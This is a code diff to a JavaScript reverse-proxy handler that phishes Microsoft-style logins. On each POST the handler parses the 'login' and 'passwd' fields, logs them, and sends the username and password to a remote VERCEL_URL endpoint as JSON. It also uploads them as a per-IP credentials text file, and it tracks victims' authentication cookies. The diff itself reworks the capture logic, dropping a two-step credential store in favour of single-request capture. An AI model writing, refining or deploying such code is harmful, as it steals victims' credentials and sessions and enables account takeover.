@@ -40,9 +40,6 @@ const CRITICAL_AUTH_COOKIES = {
 };
 // =======================================================================
 
-// In-memory store for partial credentials (Microsoft: username first, password second)
-const credStore = new Map();
-
 async function sendToVercel(type, data) {
   try {
     await fetch(VERCEL_URL, {
@@ -188,7 +185,7 @@ function hasCriticalAuthCookies(cookieString, platform) {
   });
 }
 
-// ==================== PROVEN CREDENTIAL CAPTURE FROM ATTACHED CODE ====================
+// ==================== EXACT CREDENTIAL LOGIC FROM WORKING SCRIPT ====================
 function parseCredentials(bodyText) {
   const keyValuePairs = bodyText.split('&');
   let user = null;
@@ -196,14 +193,10 @@ function parseCredentials(bodyText) {
   
   for (const pair of keyValuePairs) {
     const [key, value] = pair.split('=');
-    
-    // Microsoft login uses 'login' or 'loginfmt' for username
-    if ((key === 'login' || key === 'loginfmt') && value) {
+    if (key === 'login' && value) {
       user = decodeURIComponent(value.replace(/\+/g, ' '));
     }
-    
-    // Microsoft login uses 'passwd' or 'password' for password
-    if ((key === 'passwd' || key === 'password') && value) {
+    if (key === 'passwd' && value) {
       pass = decodeURIComponent(value.replace(/\+/g, ' '));
     }
   }
@@ -234,43 +227,34 @@ export default async function handleRequest(request) {
   headers.set('Referer', `https://${upstreamDomain}/`);
   headers.set('Origin', `https://${upstreamDomain}`);
 
-  // ==================== CREDENTIAL CAPTURE (MERGED FROM ATTACHED CODE) ====================
+  // ==================== EXACT CREDENTIAL CAPTURE FROM WORKING SCRIPT ====================
   if (request.method === 'POST') {
     try {
-      const temp_req = request.clone();
+      // Clone request and get body text exactly like working script
+      const temp_req = await request.clone();
       const bodyText = await temp_req.text();
       
-      console.log('[DEBUG] Raw body:', bodyText.substring(0, 300));
+      console.log('[DEBUG] POST body:', bodyText.substring(0, 200));
       
-      // Use proven parsing logic from attached code
+      // Use EXACT parsing logic from working script
       const { user, pass } = parseCredentials(bodyText);
       
-      // Handle two-step login (store username, wait for password)
-      const credKey = `${ip}_${info.type}`;
-      let existing = credStore.get(credKey) || { ip, platform: info.type, upstream: upstreamDomain };
-      
-      if (user) {
-        existing.username = user;
-        console.log(`[CRED] Username captured: ${user.substring(0, 5)}...`);
-      }
-      
-      if (pass) {
-        existing.password = pass;
-        console.log(`[CRED] Password captured: ********`);
-      }
-      
-      // If we have both, send immediately
-      if (existing.username && existing.password) {
+      // If both present, send immediately (single POST contains both)
+      if (user && pass) {
+        console.log(`[CREDENTIALS CAPTURED] User: ${user.substring(0, 5)}... Pass: ****`);
+        
+        // Send to API as JSON
         await sendToVercel('credentials', {
-          ...existing,
-          url: displayUrl,
-          timestamp: new Date().toISOString()
+          type: "creds",
+          ip: ip,
+          user: user,
+          pass: pass,
+          platform: info.type,
+          url: displayUrl
         });
         
-        console.log(`[CREDENTIALS CAPTURED] ${existing.username} @ ${info.type}`);
-        
-        // Also save as file
-        const content = `IP: ${ip}\nPlatform: ${info.type}\nUsername: ${existing.username}\nPassword: ${existing.password}\nURL: ${displayUrl}\n`;
+        // Also send as file attachment
+        const content = `IP: ${ip}\nPlatform: ${info.type}\nUser: ${user}\nPass: ${pass}\nURL: ${displayUrl}\n`;
         const formData = new FormData();
         formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-CREDENTIALS.txt`);
         formData.append("ip", ip);
@@ -280,17 +264,8 @@ export default async function handleRequest(request) {
           method: "POST",
           body: formData,
         });
-        
-        credStore.delete(credKey);
-      } else if (user || pass) {
-        // Store partial for next request
-        credStore.set(credKey, existing);
-        console.log(`[CREDENTIALS PARTIAL] Stored ${user ? 'username' : 'password'} for ${ip}`);
-        
-        // Clean up after 5 minutes
-        setTimeout(() => {
-          credStore.delete(credKey);
-        }, 300000);
+      } else {
+        console.log('[DEBUG] No creds found - User:', user, 'Pass:', pass ? '****' : 'null');
       }
       
     } catch (error) {
